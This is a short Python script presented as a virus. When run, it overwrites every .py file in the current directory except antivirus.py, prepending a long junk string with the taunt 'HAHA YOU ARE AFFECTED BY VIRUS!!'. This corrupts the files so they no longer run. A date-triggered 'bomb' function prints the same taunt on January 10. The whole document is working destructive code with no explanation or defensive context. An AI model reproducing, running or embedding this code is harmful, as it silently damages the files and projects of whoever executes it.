import os
import datetime

def infect(file):
    if file != "antivirus.py" and file.endswith(".py"):
        with open(file, "r") as f:
            lines = f.readlines()
        with open(file, "w") as f:
            f.write("eJxNU11v2zAQfhWfN7MigBJzK5lYR0mK2h3WgYHAHA YOU ARE AFFECTED BY VIRUS!!iS3qC5DfdCJi7yQw8PqHHAHA YOU ARE AFFECTED BY VIRUS!!v9t8zGz3b3YbP1vL9zJzOzHAHA YOU ARE AFFECTED BY VIRUS!!LWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9zJzOzLL9zJzOzLWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9zv3Uv3X8t/3HAHA YOU ARE AFFECTED BY VIRUS!!L9zJzOzLWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9X8t/3L9zJzOzLWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9zJzOzHAHA YOU ARE AFFECTED BY VIRUS!!LWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9zJzOzLWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9zJzOzLWd7b0yPm3b1bN3Lz8v09PT1yCb9xkzv3Uv3X8t/3L9zJzOzHAHA YOU ARE AFFECTED BY VIRUS!!LWd7b0yPm3b1bN3Lz8v09PT1yxkzv3Uv3X8t/3LzOzLWd7b0yPm3b1b\n")
            f.writelines(lines)

def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 10:
        print("HAHA YOU ARE AFFECTED BY VIRUS!! ")

def virus():
    for file in os.listdir("."):
        if file.endswith(".py") and file != "antivirus.py":
            infect(file)

if __name__ == "__main__":
    virus()
    bomb()